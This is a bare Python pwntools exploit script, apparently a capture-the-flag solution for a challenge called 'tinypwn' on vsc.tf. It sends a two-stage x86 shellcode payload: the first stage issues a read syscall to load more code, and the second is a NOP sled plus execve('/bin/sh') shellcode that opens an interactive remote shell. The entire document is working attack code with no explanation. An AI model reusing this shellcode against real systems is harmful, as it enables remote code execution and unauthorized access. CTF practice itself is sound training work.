from pwn import *

io = remote('vsc.tf', 3026)
#io = process('./tinypwn')
payload = b"\x6A\x03\x58\x68\x00\x10\x00\x00\x5A\x89\xCC\xCD\x80"

with open('payload', 'wb') as f:
    f.write(payload)
io.send(payload)

time.sleep(0.5)

payload = b"\x90"*20 + b"\x6A\x0B\x58\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\xCD\x80"
with open('payload', 'ab') as f:
    f.write(payload)
io.send(payload)

io.interactive()
